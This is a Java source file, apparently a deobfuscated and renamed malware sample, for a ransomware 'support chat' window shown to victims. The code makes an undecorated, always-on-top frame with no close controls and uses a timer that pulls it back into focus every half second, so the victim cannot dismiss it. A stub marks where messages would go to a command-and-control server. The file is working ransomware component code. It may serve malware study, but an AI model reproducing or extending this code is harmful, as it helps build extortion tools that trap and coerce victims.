import javax.swing.*;
import javax.swing.border.EmptyBorder;
import java.awt.*;
import java.awt.event.ActionEvent;

/**
 * Cleaned RansomChatUI (formerly ԝ.java)
 * Provides a persistent "Support Chat" window overlay often used in ransomware 
 * to communicate with the victim. It locks itself on top and prevents closing.
 */
public class RansomChatUI extends JFrame {
    private JPanel chatPanel;
    private JTextField inputField;
    private JScrollPane scrollPane;
    private final Color BACKGROUND_COLOR = new Color(30, 30, 30);
    private final Color ACCENT_COLOR = new Color(255, 0, 0); // Red alert theme

    public RansomChatUI() {
        initUI();
        startFocusTimers();
    }

    private void initUI() {
        setUndecorated(true); // No close/minimize buttons
        setAlwaysOnTop(true);
        setSize(500, 700);
        setLayout(new BorderLayout());

        // Center on screen
        Dimension dim = Toolkit.getDefaultToolkit().getScreenSize();
        setLocation((dim.width - 500) / 2, (dim.height - 700) / 2);

        chatPanel = new JPanel();
        chatPanel.setLayout(new BoxLayout(chatPanel, BoxLayout.Y_AXIS));
        chatPanel.setBackground(BACKGROUND_COLOR);

        scrollPane = new JScrollPane(chatPanel);
        scrollPane.setBorder(null);

        inputField = new JTextField();
        inputField.setBackground(new Color(45, 45, 45));
        inputField.setForeground(Color.WHITE);
        inputField.addActionListener(e -> sendMessage());

        JButton sendButton = new JButton("SEND");
        sendButton.addActionListener(e -> sendMessage());

        JPanel bottomPanel = new JPanel(new BorderLayout());
        bottomPanel.add(inputField, BorderLayout.CENTER);
        bottomPanel.add(sendButton, BorderLayout.EAST);

        add(new JLabel("ENCRYPTED - SUPPORT CHAT", SwingConstants.CENTER), BorderLayout.NORTH);
        add(scrollPane, BorderLayout.CENTER);
        add(bottomPanel, BorderLayout.SOUTH);
    }

    private void startFocusTimers() {
        // Timer to force the window to the front every 500ms
        Timer forceFront = new Timer(500, (ActionEvent e) -> {
            toFront();
            requestFocus();
        });
        forceFront.start();
    }

    private void sendMessage() {
        String msg = inputField.getText().trim();
        if (!msg.isEmpty()) {
            appendMessage("YOU: " + msg, Color.WHITE);
            inputField.setText("");
            // Send to C2 logic...
        }
    }

    public void appendMessage(String text, Color color) {
        JLabel label = new JLabel(text);
        label.setForeground(color);
        chatPanel.add(label);
        chatPanel.revalidate();
        // Auto-scroll to bottom
    }
}
